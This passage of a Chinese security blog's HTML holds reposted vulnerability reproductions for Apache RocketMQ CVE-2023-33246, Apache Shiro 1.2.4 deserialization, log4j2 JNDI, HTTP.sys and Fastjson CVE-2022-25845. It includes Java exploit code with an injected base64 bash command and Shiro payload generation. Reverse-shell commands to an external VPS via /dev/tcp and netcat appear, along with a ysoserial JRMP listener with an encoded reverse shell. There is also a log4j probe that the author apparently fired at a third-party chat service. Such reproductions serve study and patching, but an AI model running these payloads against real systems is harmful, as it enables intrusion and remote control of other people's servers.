+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">properties.setProperty(<span class="string">&quot;filterServerNums&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;rocketmqHome&quot;</span>,<span class="string">&quot;-c bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&quot;&#123;echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;;&quot;</span>);</span><br><span class="line"><span class="type">DefaultMQAdminExt</span> <span class="variable">defaultMQAdminExt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQAdminExt</span>();</span><br><span class="line">defaultMQAdminExt.setNamesrvAddr(<span class="string">&quot;localhost:9876&quot;</span>);</span><br><span class="line">defaultMQAdminExt.start();</span><br><span class="line">defaultMQAdminExt.updateBrokerConfig(<span class="string">&quot;192.168.87.128:10911&quot;</span>, properties);</span><br><span class="line">defaultMQAdminExt.shutdown();</span><br></pre></td></tr></table></figure>
+
+<h3><span id="52-漏洞验证">5.2 漏洞验证</span></h3><blockquote>
+<p>使用payload进行curl dnslog，每隔30s左右收到一次请求：</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="53-漏洞修复">5.3 漏洞修复</span></h3><blockquote>
+<p>在修复版本4.9.6和5.1.1中都是直接删除了filter server模块</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="54-影响范围统计">5.4 影响范围统计</span></h3><blockquote>
+<p>使用Zoomeye[5]进行搜索，得到ip结果34348条：<br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=service:%22RocketMQ%22">https://www.zoomeye.org/searchResult?q=service%3A%22RocketMQ%22</a><br><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/10.png" alt="image"></p>
+<p>使用Zoomeye搜索一下被攻击过的目标数量，得到ip结果6011条：<br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=service:%22RocketMQ%22+%22rocketmqHome=-c%20$@%7Csh%22">https://www.zoomeye.org/searchResult?q=service%3A%22RocketMQ%22%2B%22rocketmqHome%3D-c%20%24%40%7Csh%22</a><br><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/11.png" alt="image"></p>
+<p>通过Zoomeye的下载功能，再来本地统计一下攻击手法。这里大部分都是通过wget、curl等指令下载木马进行执行反弹shell。</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/12.png" alt="image"></p>
+</blockquote>
+<h2><span id="6参考链接">6.参考链接</span></h2><blockquote>
+<p>[1] <a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/tree/rocketmq-all-4.5.1/docs/cn">https://github.com/apache/rocketmq/tree/rocketmq-all-4.5.1/docs/cn</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc">https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/48011611/what-exactly-can-we-store-inside-of-string-array-in-process-exec">https://stackoverflow.com/questions/48011611/what-exactly-can-we-store-inside-of-string-array-in-process-exec</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://github.com/I5N0rth/CVE-2023-33246">https://github.com/I5N0rth/CVE-2023-33246</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
+                Shiro RememberMe 1.2.4
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="shiro-rememberme-124-反序列化命令执行漏洞复现-kali-docker">Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44067239/article/details/106918315">莫憨憨</a></p>
+</blockquote>
+<h3><span id="影响版本apache-shiro-ltx3d-124">影响版本：Apache Shiro &lt;&#x3D; 1.2.4</span></h3><h2><span id="漏洞产生原因">漏洞产生原因:</span></h2><blockquote>
+<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。使用大佬脚本生成 payload(ysoserial.jar文件和运行目录处于同一目录)</p>
+</blockquote>
+<h2><span id="漏洞环境搭建">漏洞环境搭建</span></h2><h3><span id="1拉取镜像">1.拉取镜像</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+
+<h3><span id="2启动环境">2.启动环境</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 -p 7777:6666 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如需进入环境，命令为</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it name /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3><span id="3web访问">3.web访问</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> 能看到如下页面即可</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/1.png" alt="image"></p>
+<p>或虚拟机外面用真实ip访问</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/2.png" alt="image"></p>
+<p>至此漏洞环境搭建成功</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><h3><span id="1抓包测试">1.抓包测试</span></h3><blockquote>
+<p>查看返回包里setcookie有rememberme的字样</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/3.png" alt="image"></p>
+</blockquote>
+<h3><span id="2继续测试">2.继续测试</span></h3><blockquote>
+<p>首先最简单的测试方法是用dnslog，看看是否有回显。<br>利用POC生成想要执行的命令对应的rememberMe</p>
+</blockquote>
+<h3><span id="3工具准备">3.工具准备</span></h3><blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/4.png" alt="image"></p>
+<p>生成payload的脚本使用的是python3,运行报错就安装一下模块</p>
+</blockquote>
+<h3><span id="4生成payload">4.生成payload：</span></h3><blockquote>
+<p>双引号中是想要执行的命令，如果这里没有公网VPS，就用dnslog来证明。攻击原理一样，不认可的杠精可直接怼</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;ping 39p2wo.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>运行结果如下图：</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/5.png" alt="image"></p>
+<p>然后便会在脚本所在目录下生成文件payload.cookie</p>
+</blockquote>
+<h3><span id="5回到浏览器抓包">5.回到浏览器抓包</span></h3><blockquote>
+<p>用payload.cookie中的rememberMe内容加入Cookie中，或者直接放进参数中，提交看页面回显和dnslog页面是否有数据过去</p>
+</blockquote>
+<h3><span id="6到ceye平台查看日志记录">6.到ceye平台查看日志记录</span></h3><blockquote>
+<p>dnslog日志刷新后有记录了，说明payloda执行成功</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="反弹shell">反弹shell</span></h2><blockquote>
+<p>当然了，有VPS的情况下，为何不反弹一下shell呢？</p>
+</blockquote>
+<h3><span id="1使用脚本生成key">1.使用脚本生成key</span></h3><blockquote>
+<p>反弹shell的命令：<code>bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PS：ip假的，不打码，观看流畅</p>
+</blockquote>
+<h3><span id="2先公网vps监听反弹shell的命令">2.先公网VPS监听反弹shell的命令</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7878</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/7.png" alt="image"></p>
+</blockquote>
+<h3><span id="3加入payload提交数据包">3.加入payload，提交数据包</span></h3><blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/8.png" alt="image"></p>
+<p>这里使用curl也能达到burp的效果</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://172.16.12.132 --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>讲这个是因为此方法可以用来初步探测shiro信息</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="4vps收到了反弹回来的shell">4.vps收到了反弹回来的shell</span></h3><blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/10.png" alt="image"></p>
+</blockquote>
+<h2><span id="题外话1">题外话1</span></h2><blockquote>
+<p>研究这个漏洞，是因为客户要求排查下资产，然后找不到集成的工具和一键式检查的。<br>漏洞的事情OK了，还是觉得自己太菜，要是代码够给力，写个集成的丢github上就真的香。</p>
+</blockquote>
+<h2><span id="题外话2">题外话2</span></h2><blockquote>
+<p>还有一个思路，看大佬文章时，这里一直没搞懂。字面意思是用ysoserial中的JRMP监听模块来搞定的，后续学会了再补上笔记</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/11.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考链接">参考链接：</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0007eafd1f92">https://www.jianshu.com/p/0007eafd1f92</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/dnslog-log4j2/">
+                dnslog-log4j2
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="dnslog简单验证log4j2漏洞">dnslog简单验证log4j2漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://xingye.me/?p=444">星夜</a></p>
+</blockquote>
+<h2><span id="简单步骤">简单步骤</span></h2><blockquote>
+<p>进dnslog：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
+<p>Get SubDomain 得到一个随机的子域名</p>
+<p>拼进${jndi:ldap:&#x2F;&#x2F;xxxxx.dnslog.cn&#x2F;exp}</p>
+<p>往任意可能在log中塞的输入填</p>
+<p>这里拿tx玩，如群中发送，可得到tx云的记录</p>
+<p><img src="/2022/08/03/dnslog-log4j2/1.png" alt="image"></p>
+<p><img src="/2022/08/03/dnslog-log4j2/2.png" alt="image"></p>
+<p><img src="/2022/08/03/dnslog-log4j2/3.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+                HTTP.sys远程代码执行
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="渗透整理httpsys远程代码执行">【渗透整理】HTTP.sys远程代码执行</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42742658/article/details/106548456">久违 °</a></p>
+</blockquote>
+<h2><span id="漏洞介绍">漏洞介绍</span></h2><blockquote>
+<p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
+<p>影响环境：Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2&#x2F;Server 2012&#x2F;Server 2012 R2以及Windows 7&#x2F;8&#x2F;8.1操作系统都受到这个漏洞的影响。</p>
+</blockquote>
+<h2><span id="漏洞知识">漏洞知识</span></h2><blockquote>
+<p>说到HTTP.sys远程代码执行漏洞，不得不先介绍一下Range首部字段。</p>
+<p>在“上古时代”，网络并不是很好，下载大型文件很不容易。下载途中如果网络中断，就得重头开始下。为了解决这个问题，HTTP&#x2F;1.1引入了范围请求。</p>
+<p>在请求报文的Range首部字段中指定资源的byte范围，告诉服务器，请求的是资源哪个范围的内容，让断点续传和并行下载得以实现。</p>
+<p>如果服务器支持范围请求，响应包中就会存在Accept-Ranges字段(且值不为“none”，bytes为资源范围的单位)，并在Content-Length字段中告诉客户端资源的大小范围。</p>
+<p><img src="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="image"></p>
+<p>如果没有Accept-Ranges字段，则服务器可能不支持范围请求，有的服务器会明确将值设为“none”。</p>
+<p>服务器面对范围请求，有三种响应：</p>
+<p>请求成功：</p>
+<p>响应206Partial Content请求范围越界：（范围超过资源的大小）</p>
+<p>响应416Requested Range Not Satisfiable不支持范围请求：</p>
+<p>响应200OK</p>
+<p>而HTTP.sys远程代码执行漏洞正是利用Range字段注入恶意数据。该漏洞的检测，也是利用服务器面对范围请求时的响应特征来判断。</p>
+</blockquote>
+<h2><span id="漏洞检测方法">漏洞检测方法</span></h2><blockquote>
+<p>1、先判断目标环境是否为Windows+IIS</p>
+<p>2、然后构建Range字段进行检测即可</p>
+<p>检测时，在请求包中添加Range字段，如下：</p>
+<p><code>Range: bytes=0-18446744073709551615</code></p>
+<p>【18446744073709551615的十六进制为0xFFFFFFFFFFFFFFFF(16个F)是64位无符号整数所能表达的最大整数，整数溢出和这个超大整数有关】</p>
+<p>然后go给服务器</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: stuff</span><br><span class="line">Range: <span class="built_in">bytes</span>=<span class="number">0</span>-<span class="number">18446744073709551615</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v www.test.com -H <span class="string">&quot;Host: irrelevant&quot;</span> -H <span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>服务器响应 400，证明不存在HTTP.sys远程代码执行漏洞</p>
+<p><code>HTTP Error 400. The request has an invalid header name.</code></p>
+<p>服务器响应 416，则证明存在该漏洞</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">416</span> Requested Range Not Satisfiable</span><br><span class="line">Content-<span class="type">Type</span>: text/html</span><br><span class="line">Last-Modified: Thu, <span class="number">22</span> Aug <span class="number">2013</span> <span class="number">23</span>:<span class="number">53</span>:<span class="number">12</span> GMT</span><br><span class="line">Accept-Ranges: <span class="built_in">bytes</span></span><br><span class="line">ETag: <span class="string">&quot;2edebc2929fce1:0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞修复建议">漏洞修复建议：</span></h2><blockquote>
+<p>升级安全补丁</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/CVE-2022-25845-Fastjson/">
+                CVE-2022-25845 – Fastjson
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="cve-2022-25845-fastjson-auto-type-bypass-rce漏洞分析">CVE-2022-25845 – Fastjson “Auto Type Bypass” RCE漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d4702da8b93e?u_atoken=e8be5a2e-d2f2-40e8-9032-eb762ac70e4d&u_asession=016gAHNAGW5kwEmr9SHcziNNztkuT3HPV9Qi1BUpHrLJq9hEVlxH_k1w9FiGt4iz1TX0KNBwm7Lovlpxjd_P_q4JsKWYrT3W_NKPr8w6oU7K_nesHWq-uvzShryNdruwb_Ppcarp92QKzyJKyYjREPlmBkFo3NEHBv0PZUm6pbxQU&u_asig=0571xFqT6ytNlYS2FmxKjAUaC7IIZzHH_wNoBkl0fuXB7L7i_BKRMiYdR7WkEyOH04jON-Y6ZkqCQaLBYWgAvEfdDsRAMInmkstRXd3gA_02JitfEM0sXqs1ygakF_Gssvi8K917w5adBQOQPWp0fT6NXrc-haXIlf4ev16Nwyo_H9JS7q8ZD7Xtz2Ly-b0kmuyAKRFSVJkkdwVUnyHAIJze09tESGin2xLknH8nQ1NfDH10X8edffiTaObeVvRyl4WPRPQyB_SKrj-61LB_f61u3h9VXwMyh6PgyDIVSG1W88Y2fYLRHbT4ia04fxhHA1ybLonYZfH1eNUN_6rAKYnOe2A-SmkXiAo5UbaV32iFMBBLacmUFwtytO_4ZvRIY1mWspDxyAEEo4kbsryBKb9Q&u_aref=ErhmyQTxFTESTC8Ph/fkOki3fC0=">vayci</a></p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>几周前， Fastjson 发布了一个新版本 (1.2.83) ，其中包含一项安全漏洞修复。据称攻击者可以利用此漏洞在远程机器上执行代码。根据发布的多篇文章，攻击者通过漏洞可以绕过Fastjson中的“AutoTypeCheck”机制，完成远程代码执行。</p>
+<p>这个 Fastjson 漏洞最近才收到一个 CVE 漏洞标识符 – CVE-2022-25845，以及高达8.1的CVSS漏洞评分。尽管如此，这个漏洞仍扑朔迷离。尽管这是被宣称为在无处不在的组件中存在的一个高危RCE漏洞（将近5000个Maven项目都存在Fastjson依赖！），却几乎没有任何关于它的公开技术细节。到底是哪里存在漏洞，又是在什么条件下容易被攻击？</p>
+<p>在本篇文章中，我们深入研究了这个Fastjson漏洞的严重性，以及那些类型的Java应用程序受此影响。文末是给目前无法升级到指定Fastjson版本的开发人员的一些策略建议。</p>
+</blockquote>
+<h2><span id="哪些情况会受到cve-2022-25845漏洞的影响">哪些情况会受到CVE-2022-25845漏洞的影响？</span></h2><blockquote>
+<p>所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 JSON.parse 或 JSON.parseObject 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。</p>
+<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/1.png" alt="image" title="存在潜在风险的API和安全API的不完全示例"></p>
+<p>虽然看起来很宽泛，但是我们可以发现，在这些前提条件下，攻击者也只能通过这个漏洞调用特定类型的Java反序列化gadget（继承Throwable类的gadget类），这大大限制了这个漏洞的实际影响。</p>
+</blockquote>
+<h2><span id="技术深入探究">技术深入探究</span></h2><blockquote>
+<p>Fastjson 是一个 Java 库，可以将 Java 对象序列化和反序列化，实现Java对象和JSON的相互转换。</p>
+<p>和大多数 JSON 类一样，Fastjson 支持将基本 JSON 类型（数组和对象）分别序列化和反序列化为它们的 Java 等价对象——Arrays 和 Maps。</p>
+<p>然而，Fastjson也可以将用户的Java对象（POJO）序列化为JSON，或从JSON反序列化为Java对象。</p>
+<p>例如，我们定义了一个名为User的类，以下代码时将其进行序列化为JSON，然后再进行反序列化。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">  <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">  <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> JSON.parseObject(jsonString, User.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>JSON.parseObject()返回一个 JSONObject 对象， 然后这个对象又转换为User类。</p>
+<p>有时候，开发人员想要更灵活的代码来接收序列化的JSON，告诉代码JSON应该被反序列化为哪种类。例如下面这种JSON形式：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attr">&quot;users&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AdminUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GuestUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Fastjson 支持一个名为“AutoType”的功能。启用该功能后，可以为每个用户entry引入类型。开发人员只需要调用如下代码：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Feature.SupportAutoType);</span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">users</span> <span class="operator">=</span> (JSONArray)obj.get(<span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="comment">// Users[0] is of class type &quot;AdminUser&quot;</span></span><br><span class="line"><span class="comment">// Users[1] is of class type &quot;GuestUser&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>但是，如果反序列化的JSON是用户可以控制的，则在启用AutoType的情况下对其进行解析可能会出现反序列化安全问题。因为攻击者可以实例化Classpath上可用的任意类，并为类的构造函数提供任意参数。这个问题已经被很多次证实确实可以利用，并且例如ysoserial之类的框架就存在这里攻击手段的风险（Java的“gadget”类）。</p>
+<p>因此，Fastjson的开发者选择默认禁用了AutoType功能，这应该能够安全地解析人员JSON数据了。但是，AutoType的机制比这复杂得多…</p>
+</blockquote>
+<h2><span id="绕过-autotype-默认禁用策略">绕过 AutoType 默认禁用策略</span></h2><blockquote>
+<p>当JSON.parseObject()被调用时，它最终会调用到 DefaultJSONParser.parseObject()，并且传入参数 object 为 JSONObject，fieldName 为 null。当这个方法遇到“@type”这个符号（JSON.DEFAULT_TYPE_KEY）时，就会调用config.checkAutoType：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>最终，在所有flag都是默认的情况下，代码会调用至config.checkAutoType()。在这里，我们可以看到因为被列入黑名单而无法通过AutoType 机制实例化的类列表。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">expectHash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(expectClass.getName());</span><br><span class="line">            <span 